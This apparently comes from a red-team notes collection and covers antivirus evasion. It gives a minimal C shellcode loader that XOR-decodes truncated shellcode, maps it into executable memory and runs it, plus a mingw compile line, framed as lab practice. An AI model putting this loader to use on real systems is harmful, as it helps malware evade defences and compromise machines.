# 09.02 Encoding Custom Loaders

> Defeat signature-based AV by writing a custom loader that XORs/RC4s shellcode at rest and decrypts at runtime.

## Overview

msfvenom encoders (shikata-ga-nai) are signatured by Defender. Custom loaders that XOR/RC4 shellcode at rest and decrypt at runtime defeat most signature scanners on lab boxes.

## Steps

- **Pick shellcode** — msfvenom raw bytes.
- **XOR-encode** offline with a single-byte key.
- **Build C loader** — VirtualAlloc → memcpy → CreateThread → decrypt in place.
- **Test in lab VM**, never VirusTotal (samples shared with AV vendors).

## Commands

### XOR + C loader (minimal)

```c
unsigned char sc[] = { 0x12, 0x34, ... };
int main(){
  for(size_t i=0;i<sizeof(sc);i++) sc[i] ^= 0x2a;
  void* m = VirtualAlloc(0,sizeof(sc),0x3000,0x40);
  memcpy(m,sc,sizeof(sc));
  ((void(*)())m)();
}
```

### Compile with mingw

```bash
x86_64-w64-mingw32-gcc loader.c -o l.exe -lws2_32 -s -Os
```
